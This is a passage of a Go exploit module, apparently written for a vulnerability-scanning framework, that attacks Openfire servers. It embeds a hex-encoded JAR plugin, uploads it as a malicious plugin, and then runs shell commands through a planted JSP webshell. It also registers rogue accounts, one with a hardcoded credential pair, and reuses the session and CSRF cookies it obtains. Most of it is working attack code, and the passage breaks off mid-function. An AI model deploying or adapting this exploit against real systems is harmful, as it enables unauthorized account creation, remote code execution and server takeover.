212352193b67a9428ab72748b9ac48ea1e2052d105dd21a6886385b64b8c58c038f804775740fb399943d9188eb8fc181f19594b35c93ca13f4806b405a25b2bd8cce94f85d4e469679a9d56a8916341377a91616269adedb6a99b2459dd2951de68573aa03a5c85d253feaeb92e6e00c74df9c0e7e437dd53ef4d981514e0d0213432af28d254d9b7a49bf0a533c1b58efc00b1d9ed04739635d0096ae812a808fbe668f7643bc10b9ccc00fc88abb341e371c4888335c3def7025d2895a9950d2440e7cef98792b38d8651a3d3f095be0869013b3186a55a015be9500bd70373779779879619ebff181430beb0aaa9b31d45c3bf070c87123a88461af9d342c084b989f4cf716aadb079421663bc9a253cb93ed24a1443f3f40c117f0da18d8a97c84741fe8bf273806fbcc943707a33b601d26d4050f4cb8065e6fe9c76c570f019a15f5d7531c5ff2d2b75a97f356b64e6b85373e30602246e5efb6e17dcb0bec17a04212c8dc72001580831c02e428be88763852ee11f6bf640e2fb4eee024ac9410cc0e0fb8c381decc8b6f23ea45b1a3030a6b21a65096b7e032a594157289f610d9a2241dd0e9f6ce541fafef71aff48544987458235467344f160e3b42cd3a4bf40e306fc1882e745a155100ada97ac89ee6cee6c794a8a3170c235773cb2865ca01adc1184417a9159c2183d643a68d82a5fd216c05d30b2ccc112b41445f50718570c1499aa302cd34bf7ef6fc0c249e7b53183d72a0481bc12ed7118c1b796abe9584c4458165029a53fd89232d6b95af9120f9bd799a79fdc72ccfb6f5fa4de73b91cbcb574bb22d3983cd39cf3b20f58f6fae1ff16d4addebd1119b38d0bc1945a20cf10e9c4148c249f2fc748cce37fbbd3551ef6a3109de1c423b321098e2f306e065074c3cea6537b71a73c6ee7ac052006c3307901718485ae4ad1cba6907da4de8083e2075887b5deab5bebe407b7d911206c8f501451ee1f211d4ebe9bf82e327d51f26693808baa2ebdb247ad2f5d1e81207baf609f488ef897ba8f88df7afcb5fa67ec424bc9edfddcde602069bf3cb79266f276463fa8cd623c57aaf002ca7cc78b73f074e799c0f24643f7ba46f002b0e6172c42fb9e423a678c5b222fc672bf78406d1e2e99cda4fc0829b227005d22948dc3fb13f380966170ff37c9ebf00d824d21f1f949c7c6d18711372fd7acffdb957375aebc0a3747d88fe1281ca1db56cf8ba4ed1cb040bfac6d33281e73812c4b756df6d8ce0e8eb27f663123d70dfed94ce2bcca3862af55bc9289d65a47d3ddab6c055b6357f8c9cb0c9a612a2eaed029d69406228cbe48bf224cd0b83f52c32ad0edf05dca295877186703341bd9990b84f1fdc6563b9cbc04b482817309dc46a124175afd2bc575766ad1c0f2e9a852562b94775c834540e088b9224d4a5e4821eb7b0d383d100f00e1b7aca76c5b96907e6b78cf925a1386d1dfe98fc19b74ca92993960887c183801ce18080e8fc6d7f21fd73eaa7e96980be80ff4dafeab34da83597496f8fd32133cd274534954fa01060793612102bc5fd66f132cb67552c68f4535ab16537568af08d29954561b628acaf2e17f31b53f8ce2cbf18963736ad3cd6a83d76a64d9855073f917c48bbdb783a7f0c31dff0da3204911ee485f404b365aae759b63e5bacd448e91467b931a0ad126f47a0df89fb664782cb4b27e8ab6d5cc383791a73a435af576722295e8da1aef0a64630dfca916ead00da9b8da62ae36dbd80d56b5f2f872cdbe125ed4bee89590c7458956804a91a858a4d8453446e1cf71345ed00f15c23046c59dfcb544b6db0b244cb0b5c3a9be1715fb0fa74efc6f5958ddca28c769236fc3df1f789403d1ac699808b23174e259af8d4ad2d88475b12d4b5924158153ce6b682f475fb13b0c3427fdd633b12ad061eec3a599215dd0ca759bcdd6f3e4aa907754c3a4c3c25e3f495da530698b3b68193d20223bd82a899e9728c7833b4d2b3192b79e2dc5f3b1d959b694930bfe0320fa4c10a1fc519185f9dd6e0144b38e18bcdd7355a685ccce5274e26d6152e6fc4dc84b0f12c2782ac1c81a17cae67c663ca0ff5ed12f4d3f4cc107ceb5ba17c67442e859129b951702f38483b8e993a5fb98ae895b248589b30099f98147bde650433aea888501de859c864d3e29abe20bcebc98405af423be012909f141385fa51661042e66bae9041667f2e776f2e846a899a83da0eef3104c6db4cd92f0d9372e92db48364743cde3735bada5deb4164605dac560b7c51bec868d34936c04c2b09a6e47280617e14284999fdc9c56a6946e5ca244cd0f8121ebc751cfb04ebde06d7576242780badf6e1dc0c061b3ff3bab40d157766d51406dbe97e176292665a1e9031f779588fd777a1372d138c75e815a8a9bc08c94f3ba0a01f359f674ef8fbe1d4972a91d89014d93b2d7a7021a3e7fdb1ebf5866a231a3528725d06c765b5084d353e48871e205468212f2a3fc88579e9faaba7d8515b98859ae74b0d65a83418b0b06418362b367b1b7d3d2dc3d371337194dcb73ed145f11238522a490a6e2e81c953cd252dbbc019452f56d7f4741ba7b4904e98e4bbdd11b251af91357890885239ebf1c69e167371b7c12acdc92079e3be173ea343dc21ffc65e3c0bfa423e5c894eb8ab6d121614d96d7642ce889cb709c3a4aa20926bca78f88d8b8f26bdfe57859e4911847ded26aa20eeb10eb0900a9dc73b16e13a0946109d2784f9e02399990f13cca3b89912e98e3185fdae3eb31f74a8927c340f3ea79e34cba82dbe432db1cb5b394bbe3099933cdc4bbe844c332741bf82150e9551bae6694c1dd60c497fa6d54475c674a23a22a326378e48291f53d189a139d298856b2dfa984dd77b84999aa5aa35076225ed4056a504781b9056f0aeb40577a9851c87bff9a6d3ad6a250b499166b53f4c4527ec14e798b4a7ae8b9b2016db86498552f263a98d0b33894bb88d92ca717f8b646f3458e45078fe8e1923ebc73da79040ed39293deb589cd5dda16d1ce16f6347897632995d7952141bc546d4c59e8ed048d4c0d49ecf2453823847234d5e3084e63b7ba805762619529bb1a2629820a5a6683cd4d6593aec473257cb5d03724aac26fbabf123d2b722e694328cebf9faf3f2f32b73819a8e6eb89d4d1db2bde6a132f60381b2742376055bf5e31f32cbc80ca51c38906880bc594ce4ad263940213350f9c26a687d235bedd5e59341a8b5821d1a27314ae26ccc5a5e206ec6cd41b24239f49d536395a3ab3053ccb61fe49da9ac086228c6924dfaaacd3ad6922ac216278df16e321d9d769df8b2cb9656e9746e04b40333934891ef6452380e4447e209013201668b81af453d46b828c92318420d7f3f924273d93b15e2572ce04a21273d5e140f602a4cc9efeac0e832b433b4d843a4009404ea80d49ebe5a2ee541348f78d965a3093bd68954aae1e862bcceae8920e5e0044949235f9491634b8ccd1e16b0dd4a11b6f095aa2165675978dbba0d1fe9c1e64bfc7c4eb60e6d79b5b453f14fe1e325787c662cc26cda515f64579d312ad0358f62cc4df79fb3058fbf4f22cf99ef81791187009266c5b0355c32468eb1532a7e07033c3101c54be5a7a8b7d26bc97e3ceafa122ac36e733569777abcb158e84fc4e50c8501a54032bf41980d1277846f75e4c7bd9bd34167e391292e5a2bcc384dddaa973c1d0369138e61238a53c9fb96db96c59d0371819bce487ee6435bf7dafbb477d018d53bb1762d9c746d5cc55cbbe102de3b8e0233fc0cbb6c9edb1eba3db4de1f43bfa2a48ebdc10246462471cac35d7160f80f0b408834cb44e0bb7e364ecf3c3a5704d86f7cad5bc759311d30ed21b3fee8f2ed35f5b7488e75c331fc3ae121bff55620db48c5f7f158dd0b47ed2f8bbda9e55ef6fa78edca532b9a4d7db5af5b5143336b7ff3294148157d24219e918d5537224a665b51b416503779673133199e4d0e0d1d3aff4ab2496f18c41d36e9164befa01dbb3a0236108b36a734a1ade8e3fed3da78e6d4b8886782aa0cc702176b546d6c2d4bfa7bb09ec8038df69569067aee07d494b8788fb28a7a79126a3abc84636d6eab2be6171d72a48a295d697efc6d22b1fb6d180a85de85f94c4cb33447ffedbaa10f0593f3e3d315c9122ac554b80b130f79fa52e1951ae3a99fc409e0f2726158f6b2f0b790cdadfc70865d0986ae33efaef6fc50efba1a7cb3f06c5bab12e65036c9005b083214c1393c098c57535768a98e080109a9ed5f380f08fbf30b34f66808454c0956f69d2e015778ee5431869f3b9162317c26c9547333af921517c912b7f0d8638bc64f4ce78db9726800f4d0b87b1d8c23023038f78286838e993c32559fb832b7724be841ac144edfb028c3baf22f41aee96e7df00cc086f4717f50cb117c1ea2d657ee15b6584ebe587d85db335406da91f158b97a45d36aeb8f7ec1377b7eea00dae803862a06e84c22e4c8627b5753cd83f15c81a0239e2daaf215ac8ca628ebed798f0d3f386f9630cb7891d1b5c5d57d0c9434159fa9b4c51b75282fc9a27087f65779ec6f713fe92e5c56202b2ac5b4ba1d297e127f1313095c702d3b3ed2c962d4ed55d41067a675d78bd8878b4f3e1d3e278de64b63c5349dd5c84a18da98b1a01d2b9c494d18e23f936f79f980b6d51311f1e870a95c52b5bcf8d4d29ea9e9881e1001aac31d8e0c23e7be84b40315f0e8e8b88f16a6a8723f40827a0613b77f911328474ae7b6514a6f6974504131007520c242dda2173841455c29118eee1c48f722ab42f90a11cece332818923f30967caf23ce9bca1cb295c003ce19d5c989ab4b08ce13ac7933169c2a1fdf413443d67e742ff5a24359d4bac8421b76466c664571f406ec4c02a59258b9619675e65cc64ca1c858e99b8999bc381c5b5cc333855c6c0b0bc50ec565a9c80ac6e5b3e51ad9fbbdf5910e7355d4fda42060660ff926569a803e7f70bdafbe2b56a48ff8da604501a7542eda6c1a32415f7099e40efba6709007694ebf9f6c5e09152a9b54d2c569900735f2ec5d926abe8112082438d04c36a03b57ecd2f97eddedfea9ebfa29e0fac95136afbba6f8933ee70ccfbb1cf5073fbe70ac6b85dd4b6fb9eda1040fcf0c17050f906abce11ceaa76cd0274f107fd3b71f5a5e6c04108403f943fdf1fbb4fce30a5de1e09f42c081536f13d51077fcc1a015fbc0899084932e02fb292dee683e324e567fc85640325e935c6b9cb8e0a29722c8dbf333158ce2893a661b147eedef78f5a427d68b8b77b8bf8b39995bbdc396ee140d081f1901720e5cc1b8b0f07b61cf429dea325cdf13570486782d0f6c44ca8ee7a999cdb875f13830f5b5047f4861d6a2374ed69f5cc778f226ab1a546dc150df75d311ce5eda7eab134be1089e7d30f88d6b6da0cd9345af909401e54455ecf194f35db343060000c687e31e5eea93b2930b03d0151b3131706945222c33cbd79141e5c7a1d591c554c6c68b48951ed73b990b801f64758472f6c7d043990bc949aac9be3e45a88a2819893422efa6deeb52c894444026b3c12c32c25467fa18e3b939e009c7de219bc43b0e02e94ee391082de2b5717f57c1dbb12fab72d5aa96c736dc1db073b35672d5ed6036b68c09ca347c9c198896fd4a66f005fcc70480ebfb04a04183d549f41508c816090888fedff980f09f73002d781f95fda4971cd23d39f21498f77005c47161077c3060a825f1588c4c4412c444b9b2f6e41c233d26662dced0a88dc03eb5752dedf24a03ebcde8c64ac8c400f4f2a6f313bbbb673f97cd755bf7f60b71f7767aed8797f3ce3413f2841e7b7f0161b373f76eef2ee7497782978bccd75d77f5f69d485b989ea2c201b90c7688d0c822481923c00fbe0335e306bc8643a1c478a4f9a5db12b41e9281c97cb6bddb1e3e9c565a62368cfc6d86fda1dfc0478243897bad1a5724b0b751583c7a24c865682c8a8cdc4ce611ce6bbe887833cfd890ca220e06b6b54a4a2ee2cb6b1ad62f149ebd6531b306c05ad11b8b5ab0a2349f15e61ad0d2525e701ae0b1072a92b0e39d35554ad878d4e7521a924a2a7072b7e8e5d22c0c37e118f2d845c357b96346412614bb725aadbce557e9e83cd4e9f8947741e882ce6224358b51f52111ff3d144f34c47ba936927ea67e39cd6203dddb39ba7ab674a63994c367db3d87461af29df3e21c6f7e0b840caebe36d98c429a7af32b180584ea5133ec9859a8884dd567b3864d3c690d33669cf7c3a1c5088e59e6302cb83663bc59ecfd4911bafea4c90dd11acb786c46f3934a6de30e71f88488afdd18f7505cdb4474ce565163c48c501ed9b9f3cabc90f9665109599f35625eb3aa28ddfaf04fd782d1404686c9b62fe0312b29f2ec768c969ddcafab838995c48450ce39a079cabcb60b8bc3cbbb7c6a4159e0b672c8caf5882c28d052fe5800a6fe30fd46e308c60200916884b868d5f239638af3ed30b7d9f7d96defdbf416ab50e93628a454436fe71b7e427646fefa16b62846519f9685391bafec55052bd693165cf532ecf081f1acd219d0b91326a8fce2886b8fe5f073a68af03677f2674a9146e4661693a5108e546b283b36f6107bbd6eb72f74a13b0b8505107e845a102b8080c60ca8b0c5d26376fc2280f532bd46fc6bf189520997e98627986d24c42f2699d27905e05926df498bc7ab887aa3ef9bf879049f9743e94d6f75b916afb2d52f14d1db5d5d0ac2629850a9ef216eee25cc653dad78846e8f8e06f5c472f1dd0999e3cbafa849973f0a0f7fcbe41ba71a7c5fe93d8f2ab0fb99e03d63f3ad7b87b9c1186d3c93569b95ff75d7c9f304ffab33b88c95b66746a68a80e26a0716229b688a338f1ab2786c263a7c927018a9341e654daa926c677fae720e6b4e4a8dec9be03778663d6174735dfd7817075970b18af84c039666705604cd1893e8aa8ab202485b1fae58f28c6055a72e2cd1c673d0919ce3460545719da812cc384d45cf2edf987a161a730f3932d031616f62bec7510c85c6514e0e7de42369015b19ea33eb230f9f713af158de1cefa5147804e6dd548db69b92bb35cb02c89c78348bb64b9009f32b79b4971e2fb1b3a7012d5b2b365fb8df2707b72dc2a0acaab1bf40f64e388b2b7e73cd4822ca99bf54e41de4139d58aee1dbd9329518796e89f97809cb2f410685b8ea4242845eb651b0ad39d4d0ef3e5f231e3811b7ad30ce1ea6bac11f2a7fec21c755ec311db73dccc299f774d9c1ac1deeb65a50cc5f50b707991491d7d18ad277e8e2a3b7af588adf1d3962d10850f8e81405d65be7e93e88e6fe6ee0b59d656408ec03ef7162fb15fedcb7a8e178fe8ea33cd920a1e550b3b0204286ed53dc2e31c14cbd8d7c2476fccd9eb1861185b515cb28a54f27d27b35f556f5c81454c94ca7276654a01f5d3b02d53d0b9ddbe61ac47706b22a3d5bbee40cda92fb8fe145a03e06d243a733463be34ec2254f8a1618a36ee6ab13d7f65f06adf516f34ab4f9fb39dc143f7920565b03dd30f5daa75c3a0238d6595d5dccfa54f659c6dc214d8b8d130890397c81a26df469116c5162f1dba107c5e74d5429dc66dedac33c40532889715e6644b6cf1aa7c787fd772df273f06181a0568a67a13053bd9aa330989c1fe13b4fdf8f555df116a7315ab37deca39587a0dc7ae25bdaa7cfdaef272c3973b0f301167cf61e9f7e86156d719928cd232a0a3dd8706a9836e4d425a2cf5eb98bc275f43d5f33550d3d49bc97c6573788d306fbe204df2fb390413742f74afd70724291588f09030ac70ef4e3a832ecf7cd754a93e8da9ed22245479bc71a814527b4cfb531fe3d02cc6023e5ab74565a1a36621edfe873541b4c516ce8070576f5d99e22c3ea9c3f1c03399edaade38f3d57f1eaaf55433ea367a86edfe770fb05be18f1c783c20f158b10e31a5e8e229a0283cb0ecc59c4bf706560347f55ee28dff687e0d03d40c57f892464f6bf6a15ea7f31c577e123517b0ad7c6a44fbbd297433c1f1a289276e55614110759021629605af421d94facc96a4c5e9506ea46881ac71f281778da65506feac7c40433348e7d50a64a2c33a499c2a1e13f5fa78a4181e46f77362db55a3d96e2cb6b9f10a67215d18da74ddb4a33a9039931d94e3c26b93428a17136b274826421bd5864662daad3a066a5fac8422fcde0faeacbcd882aaf7973f30d003d99ac8d56d5568c0936ca629662a9c6646561617d17ed96419467255d4b7acfab74dee4bea2b88c2d5e069bfd8bd54d14858caedd078ce0c5a6f5f676b7a9f3c0faf71c3413eac7755a765f1f6a2a86ef99e9c30272b4e82e251bb76e6fcf7547463d68b9f5462470a39793d6b4758b56444cd7ca54b42d4a6cdcfb2ae2b5a3bc554646ab74f9f2aab2d68b94686ed2e76b65ba79ab8f67dfbc2538940c74ce301da473650dbec2c8e737d456cfaf8b1d172b909ae5d6b553e493d29c957e4cadbc150689436cb34177b33345a244cec059f6308a793585587f1fc4c8716b46d3c1d0c0400836311d62664f9a08a76cf6b92338e27cf8297ed5a555b7a90ddaa4199e3b10a3be83a77f11291a9574a2ad41822628c1ba5dc98d3ff76eab2ac594184d5374815db7a93c5bdabdc2a2d6ad5e958f0875f6721588cfd6263c0c6d0014b9498335e6c5e580922e923e9f3759aa481c539549599ffde2645f67d91490489dc5b0b0e5491642ee5e5be43dc5dda6eaadc921594def5d34854872487bbef50d5d09ca0ccbec9c04b75dfcb63e3ca51db2b4ecae663f5398df1bca0ae0a7fbb00f6e5374aee22bec2679a166372a0dcead4da736edc53c06ceb17f2998bd924c3532b498930a17550897062a4bac2748f34aed8b598229ce6e54abc82839cb1cf6cd184c9926f4186ad26041db00e979f257bbb352cc39e5545a37c5ae3b41361e27092ce9c628b29179c1596f6bc1f14fabaf25a5622c9c3c864a198332e88de1f830f114ddcb683fee8bedf1eb9eabf3e17897465d514fc79e0051bb2ad03d3ec06d41ca1260566466bd5d8726814dea480b1a6418de134ee7e52e371a1de5d0e5afe096562d6b83b471dfd3534e3b74d4cd7ee55651146722ed9368609d1124b7db2acfe4a794125bd66c0c1f9a5fba179e7e9f4a4fa8cef2bd675b6ad0334082e44cefe318b26831f55146a46b52d74da71f5fc98cec4028a7f948855cd7c3a9c59e3a092d67256b93b7524cd05ae8c6c157b6befbb84167951c59125537c6fba2a9a841300947afcbea11ce7b43ddea3f7f8a2a8dc6e2aaeb07ab5a6ae1046748c31052ed22ce9b64d97808a62256511e27ac7d1e93a4f4bc4d5519f1bde52bd8cfd38e0d1ec5785e4b74ba1a4145f0ddb4912ef98ecbddb13d35859709a41c04c44135c60cc10d1a152f30dfe06addee98ddc28650f680595082ce9f4a96e4285d94f12c59cfaf6aeb3d9741ef440ce261e5665e63b4307fbfa7bea89e6cb357ab84199e284bdf6f44e0d7893c95a88d72c7b49c9f0a756ef98651c11dfbfa7132ff04633e5bccd6f3993410f248b5ff66ae3ffa5c41afb75839266ae249ef6d556e83d028fdd0cdbc035791ca8ed85acf73658f57c50066186ea24e429cc03be298776c6ce6975de957ab9306d6b29ed7380d8b99c34d5de9ea335e483c934614e2da732d2cd1ed93791708e7d9c93a6269b9b21116616faab5f122b9782ffdbef25c79d8795de97d7413ed584c42ceecdf9a7c388d11a649179c09bce69c3e847b9f8c9c294a1c6de26b8b2b2e773b2a19a68d51e648684a953638291342523eb47f38a25480bc5372dd8184bcf5d64a73bc532038acf51665d2eeedb6685115d48c4314a132e278a40fab73d53b7da7b86c9aafe40b77be5188f88f9d9dbca2235617d685054f33ce4007735dc44686bd25f159e0b227ef9cba4aca10c5d40e305fd4d2873b7acacde16367a39500e47c3bff851fb56ef65ac866ad237817c8c2c8c3d1203440749277671a538714dc0a67a7bafc7512895dc2168d15838e534ec1813c5fc27061bdcf0e5ed78aa2f63759c95d15baeec9b30af95d9f7bf788aee89407b8b15857e7ae6c8eea1b8c45079f03d9606e8a9aaee6273a7343dcee3d7a60d23d16facd62562101e472b898552d0e0967aa7b7df3654cfab6fa31b343a4f5a535d0f5461c2c7d181fe34dc4662ea80a75658ffd4ef327536db342995a15ae06c5fb63ec629b38c059eff7ce7176d9ce750bf4b5f7cefbbcca73b0b28b5cffe572f89a01e8bfdc2f50cd17e3750bf41b22d89c328e7d95285bfc8508a8fc84a3de36fdf530860d97b37c0f2b6b483f739cb4b15cf926ca847e94f45a7fbb9a85d7efc358017b8ab8af1e813f0b61ac6c2bafdde4d8aefda530038a3c2700d186f4ddd3113eebfc57579f257c3d6d67dcf2d40ffe02effd510b2f091380f6bd384f25b795b0e84b5d37a1c4ca5554645a1023c4128627276d07b8c3f8a796438885cb120ddd4931cb82cd366979b362f245e27878b41def7085c4ca43e12fe26bb7cc5b8e8eef0bd1c0832bd2d5212fb6a0d4e5d968cb15a5b2130259022d1720aaacc68ef5212fcb334f65169a941ac99558951b31472dfaac6c72f2b464bf6f352b23ef1ae752384d4dcc51e66aea3686e248abeb4cd4f1da9eec807f563a213361821349611e2c044008fb121176abf1504542f0d0ec8d3e34e8f8829d52936ec594d1ec69b9373c35d092ac4b3d28db710788ba46ee7f862b4d4f4c17ca8c1f829cd5a08d4e677d38a1369928aca07b1711b0c24da5a5f33ebfa1c29e160e9ded010ccfee4475533bf3e28e8d5e21a5786847d0b140ad3ca64bd292a687ebf38c86121a25958cb4b7b1a4c1db101799d149306edb2467673daf87c4bbc98fa6539a9fb12825c7f8128cd08d0215d588cc724d9442e11df5c41e264703c45e58c3382e51410b6b591570011ff70d18aa454fb438a814b367aa77ce8508f0e22522f12965c780f3e0a2be0c54ab5323d0f736e93a8a023d69b051b7726f846ca5bb4890b37a6edf15bbddb0ab4147cc5d7d72a4dd4d1f8618562c23e76706d5d5cd5112c40074468780e6ac0ccda16978e88d3e809199ef27d84f8783ea6b6567f4cc8af99e90e79a1fc833b111a6d8a212cfba48b5bbec807947155c7d38eaf0d7eb8a875dff88f3499043b819ba798b1eea9200ea9cbf618700ca5e604593c1c5e8433df9f9d02b6b74b4fe27f70f359e302878bda0605b6f79a5287d32193762825db63f7ced8b7f96a8db971a21c24beee724dec54e2868512718f2b5c13c4f39bc0461e3a266b8f24245ae0bf7129cace756a8f51a8fee2d9512d24b901f33577972fa1ae893ec583e82738f374fd81276097edfe113e06d97c4749feff37e61d7edd6409ffccea8a1de3e634b627772f78af8d8c70389614cbdd41d169481966164e9d321458b7297dc96595804d27d68c7f8476ad59c777ea0b21080c801846e6a41935af2c6931af5bcf5a211a6c366c56d9e6d533cb2eb575c143da2d459a2c13af1f0583df7f0ab6cdc1567ba890dd762ea2fae8719d4f5fb8509db650267db87ac00e75f193cb2a7d4fc12cfbb3dc0404054a17ff907e3efb29538d8dbd27bd8da2ca8c8caaf31beeabca876b89b857fefaead42841ef8ca4a95fa150cdcc90269bda63dfe6a5de7ebdb4d77238af68d570f8e367297c009e04486b9f92143e39bd78cc9349eec591feba940354be2c74e6c1e80cfd24ecc7c531469ec56902124e1c9b7366d2e72394a5af5889f122dd56889548bf3dd9b39be72661926c11e0be4383d18ddd3575aa637dc1fa1f18f9b393fec1e3c80d2ccd36ecf7293c387cfd10934fadd69618c7ba6fbf366778478d49ac29013a4ec78a53ff6d76925bdc90e446ddd9c387a6b83ea908ef3817e93693cd5d1a717ce5df540ab82e68ca840d106b9224acb3aea4d5ca27a3c0f634ff02e9bd3dc1bac354131ef697edbfaddaf547c9316dd083616f2e657cde2853cf1d0e283b60d9f69ba40cb31ab7a1ffad7be5e1d5f9f12b88b1c56ba64082f909613552796416818401d1ada20c698ce5f4028c03631ea340b130c0fbdab025ca7476a5456b5fb924610403d0fb59312d98dd0950a061a22d1d207f8b4b750c0c71ca2d1fb6e3529bf814d0a5f500040327c124a4be78a2725192409093c4e6d541088b455375da358d711c77ee98a9656b596e73a90a61fc53dd6a3b64ceae922380f37c35876c9743c23a48458c29cc5e06cc6673ad0c820c8a8a8a08f9fbeece65811b7b900d8f5199a0ad28c6531e3e5e33c7eebce5f8a9500e794129f5ff980aa108c9ac3324080d2eb1f9842be863dcb67192674766a0fcdeb9946a857127565c8b031aa4e207ace83fded2b8671f585d3a2d8de176bd3cb56dc0d0d9f1aadc76bc4026fbdede77c1c5b169285d0f182f0252b54aea36fb61884748995a59d2ab58126ebe7bcf641a18622c0d80dfbadce575f6e05c77a355fb2f2779ff40783dab0914247297efdd2f63fdeebcf7d79db65f75dec61df57b3bf59f40e4edfb738b9589a3a9b8ee521f509228028f8eb3bc27619f61a907f0a1434b85c5fe49112f33e7615073eca6e012ef0a1485cd27781d1298173093bf8af25797b71daa63f51977fc5c71366d71db33d5f6076c0745b39dd79229f168a5f8619ad334bc69dce4493fbb6cb60a7c2760ffd05b91fd0128aa8200d0a860efec74edc7f2d85012020bfefcbfd85e18fcdb3bf2caf40bebc8d05f9c94afb03f67b66da1fb026907f596b7f207ecf5cfb03b1fcfb16b43f23c0fb890016f4bfb3defe3113e94f4cc2ff0dd30f67ea1f33d2fcc418f21719ffd39afbc7c4cc3f114ffecf88ffd3aafbc7fcdc3ff11380fddfacbb7fac17949ff2b881fdae95f78fe1b83fc18b7e0ffebb47fef7ccbd3f78d6ff94e73feda97f4c47f6131d1ef85fb6fefe31e5cf075cffaf52fee591e4f989bffa7fc5ff97865ae8a7443010ff1eabf01fe713fb299fc5bf25df2f36da3f6e9ec83fe51c87f81d2bf11f83597e02dfff57f05fb316ff71028d9f124841fe9d56e31f97a8df331bff6b290ce881fc375b8f7f9dfaf7cca03f5267c0fcddd6d0dfd6f25bd7e18f5abae0fe3f78107f5dceef39dc7e94b38df077fbdd7e5dcbefbd70f9a3960ddcbff7f5cb5f57f27b4f7e7f54b249feb73f07fee9c4f99d49dc8f62f238fef629dd6fe5fbdb9beb1fc52473ffffbad556908684fa474ebcef9fe7ef274df87f5cbffe1f504b0102140314000008080045bfcf56acfaf4383c0000003c000000140000000000000000000000a481000000004d4554412d494e462f4d414e49464553542e4d46504b010214030a000008000045bfcf56000000000000000000000000090000000000000000001000ed416e0000004d4554412d494e462f504b010214030a00000800002dbfcf56000000000000000000000000040000000000000000001000ed41950000007765622f504b010214030a0000080000079ccf560000000000000000000000000c0000000000000000001000ed41b70000007765622f5745422d494e462f504b010214030a000008000045bfcf56000000000000000000000000050000000000000000001000ed41e10000006931386e2f504b010214030a000008000045bfcf56000000000000000000000000040000000000000000001000ed41040100006c69622f504b010214031400000808008cbccf5648f12ac339010000c40200000a0000000000000000000000a48126010000706c7567696e2e786d6c504b0102140314000008080043bfcf560ac49277a50000005f010000220000000000000000000000a481870200006931386e2f6578616d706c65706c7567696e5f6931386e2e70726f70657274696573504b0102140314000008080044bfcf567b4a11babd01000022080000130000000000000000000000a4816c0300007765622f5745422d494e462f7765622e786d6c504b0102140314000008080044bfcf568abead34443600009b460000300000000000000000000000a4815a0500006c69622f6f72672e6a697665736f6674776172652e6f70656e666972652e706c7567696e2e4356452d312e302e6a6172504b0506000000000a000a0071020000ec3b00000000")
		configUploadShell.Data = "------WebKitFormBoundaryRFAiXRO6W77il7yc\r\n" + string(uploadJarContent) + "\r\n------WebKitFormBoundaryRFAiXRO6W77il7yc--"
		resp, err := httpclient.DoHttpRequest(hostInfo, configUploadShell)
		if err != nil {
			return false, ""
		}
		JSESSIONID, csrfToken = getHttpClientCookieInfo37450298(resp.Cookie)
		if strings.Contains(resp.HeaderString.String(), "uploadsuccess=true") {
			csrfTokenReg, _ := regexp.Compile(`csrf=(.*?);`)
			csrfTokens := csrfTokenReg.FindAllStringSubmatch(resp.Cookie, -1)
			if len(csrfTokens) > 0 && len(csrfTokens[0]) > 1 {
				return true, csrfTokens[0][1]
			}

		}
		return false, ""
	}
	// 执行cmd
	execExploit3478923 := func(hostInfo *httpclient.FixUrl, JSESSIONID string, csrfToken string, cmd string) (bool, string) {
		cmd = strings.ReplaceAll(cmd, " ", "+")
		configGet := httpclient.NewGetRequestConfig("/plugins/org.jivesoftware.openfire.plugin.cve-openfire-plugin-assembly/googlewrite333.jsp?cmd=" + cmd)
		configGet.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		configGet.Header.Store("Cookie", fmt.Sprintf("JSESSIONID=%s; csrf=%s", JSESSIONID, csrfToken))
		configGet.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
		resp, err := httpclient.DoHttpRequest(hostInfo, configGet)
		if err != nil {
			return false, ""
		}
		if resp.StatusCode == 200 {
			execResults := regexp.MustCompile(`<pre>([\w\W]*?)</pre>`).FindAllStringSubmatch(resp.Utf8Html, -1)
			if len(execResults) > 0 && len(execResults[0]) > 1 {
				return true, execResults[0][1]
			}
		}
		return false, ""
	}

	// 登陆用户并且读取登陆 Cookie 信息
	loginAccountGetCookie3478923 := func(secureArr []string, hostInfo *httpclient.FixUrl) (string, string, string, string) {
		JSESSIONID, csrfToken := getCookie4738998(hostInfo)
		for _, secret := range secureArr {
			username := strings.Split(secret, ":")[0]
			password := strings.Split(secret, ":")[1]
			// 注册用户
			registerAccount487579347(hostInfo, JSESSIONID, csrfToken, username, password)
			// 登陆注册用户，读取用户的cookie
			loginCookie := loginAccount74859(hostInfo, JSESSIONID, csrfToken, username, password)
			if len(loginCookie) < 1 {
				continue
			}
			if verifyAccount378297(hostInfo, loginCookie, username) {
				return username, password, loginCookie, csrfToken
			}
		}
		return "", "", "", ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			username, _, _, _ := loginAccountGetCookie3478923([]string{"b94a3fce:75922bd2", goutils.RandomHexString(8) + ":" + goutils.RandomHexString(8)}, hostInfo)
			return username != ""
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "register" && attackType != "cmd" && attackType != "webshell" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			// 如果，默认用户失效，使用新的随机用户来完成，接下来的注册
			var newUsername, newPassword string
			secretArr := []string{"b94a3fce:75922bd2"}
			if attackType == "register" {
				newUsername = goutils.B2S(ss.Params["username"])
				newPassword = goutils.B2S(ss.Params["password"])
				if len(newUsername) == 0 || len(newPassword) == 0 || newUsername == "" || newPassword == "" {
					expResult.Success = false
					expResult.Output = "注册用户或密码不能为空"
					return expResult
				}
				// 清空默认利用口令
				secretArr = []string{}
			} else {
				newUsername, newPassword = goutils.RandomHexString(8), goutils.RandomHexString(8)
			}
			secretArr = append(secretArr, newUsername+":"+newPassword)
			username, password, loginCookie, csrfToken := loginAccountGetCookie3478923(secretArr, expResult.HostInfo)
			if attackType == "register" {
				expResult.Success = username != ""
				expResult.Output = "username: " + username + "\npassword: " + password
				return expResult
			}
			// 提取 jsessionid 和 csrfToken
			JSESSIONID, csrfToken := getHttpClientCookieInfo37450298(loginCookie)
			// 检测是否已经插件
			success, resp := execExploit3478923(expResult.HostInfo, JSESSIONID, csrfToken, "")
			if !success {
				// 安装插件
